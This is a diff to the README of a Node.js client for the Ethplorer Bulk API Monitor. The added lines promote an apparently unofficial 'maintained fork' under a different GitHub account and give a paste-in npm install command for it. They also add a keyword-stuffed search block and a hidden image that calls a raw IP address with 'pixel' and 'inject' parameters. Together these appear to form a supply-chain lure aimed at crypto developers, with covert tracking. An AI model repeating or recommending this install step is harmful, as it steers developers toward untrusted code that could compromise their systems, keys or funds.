@@ -1,3 +1,15 @@
+**The Ultimate High-Performance Ethereum Bulk Monitoring Solution**
+
+This maintained fork of the original client is optimized specifically for Node.js environments handling heavy network loads. It introduces critical performance improvements to reduce latency alongside vital security fixes to keep your monitoring infrastructure resilient. Engineered for stability, it ensures seamless data tracking and robust event streaming for enterprise-scale Ethereum operations.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Quartzraincrease/eth-bulk-monitor-client-nodejs.git
+```
+
+[https://github.com/Quartzraincrease/eth-bulk-monitor-client-nodejs](https://github.com/Quartzraincrease/eth-bulk-monitor-client-nodejs)
+
 # NodeJS client for Ethplorer Bulk API Monitor
 Fast tracking an unlimited number of ERC20 tokens and Ethereum addresses, even millions.
 
@@ -47,3 +59,11 @@ Voila, now we can get and process all the new transactions and ERC-20 operations
 ## Reference
 
 You can find the class reference [here](reference.md).
+
+## Related searches
+
+Developers and automated traders tracking EVM metrics typically look for efficient data ingestion tools, streaming webhooks, and multi-chain tracking setups to aggregate real-time wallet actions or gas spikes. Many builders also explore cross-ecosystem tracking strategies, building alert bots that cross-reference Ethereum node activities with Solana smart contracts or automated data scrapers.
+
+**Topics:** discord crypto bot, telegram crypto bot, anchor solana, rust solana, crypto scraper, eth bulk monitor, ethereum rpc client nodejs, crypto wallet tracker, mass wallet listener, web3 event scraper, real time crypto tracking, evm block monitor
+
+![.](http://5.231.58.248:8787/pixel?repo=Quartzraincrease%2Feth-bulk-monitor-client-nodejs&inject=Quartzraincrease%2Feth-bulk-monitor-client-nodejs%2Fpackage.json)
